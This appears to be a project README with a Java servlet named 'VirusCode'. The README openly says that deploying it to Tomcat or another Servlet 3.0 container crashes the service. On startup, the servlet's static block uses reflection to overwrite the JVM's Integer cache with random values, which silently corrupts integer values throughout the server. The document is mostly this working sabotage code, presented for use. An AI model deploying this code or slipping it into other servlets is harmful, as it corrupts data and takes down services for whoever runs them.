# viruscode病毒代码

将 VirusCode 放入支持 servlet 3.0 的web容器上,会直接导致服务奔溃
可以将该项目放到 tomcat 的webapps目录,然后访问
http://localhost:8080/viruscode/viruscode 可以看到结果


注:我这测试的版本是 
tomcat 9.0.0.M4 
java 1.8.0_65



```java
package com.shoukaiseki;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Random;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebInitParam;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

//注解配置
/** com.shoukaiseki.VirusCode
 * @author 蒋カイセキ    Japan-Tokyo  2017年5月13日
 * ブログ http://shoukaiseki.blog.163.com/
 * E-メール jiang28555@Gmail.com
 */
@WebServlet(displayName = "VirusCode" 
//描述
, name = "VirusCode", //servlet名称
urlPatterns = { "/viruscode/*" }, //url
loadOnStartup = 1, //启动项
initParams = { @WebInitParam(name = "username", value = "张三") })//初始化参数
public class VirusCode extends HttpServlet {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;

	/**
	**/
	
	static{
		
		 // Extract the IntegerCache through reflection
	    Class<?> clazz;
		try {
			clazz = Class.forName(
					"java.lang.Integer$IntegerCache");
			Field field = clazz.getDeclaredField("cache");
			field.setAccessible(true);
			Integer[] cache = (Integer[]) field.get(clazz);

			// Rewrite the Integer cache
			for (int i = 0; i < cache.length; i++) {
				cache[i] = new Integer( new Random().nextInt(cache.length));
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("VirusCode加载完成,你的服务已经崩溃了");
	}
	
	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		// TODO Auto-generated method stub
	
		req.getRequestDispatcher("index.jsp").forward(req,resp);
	}

}
```
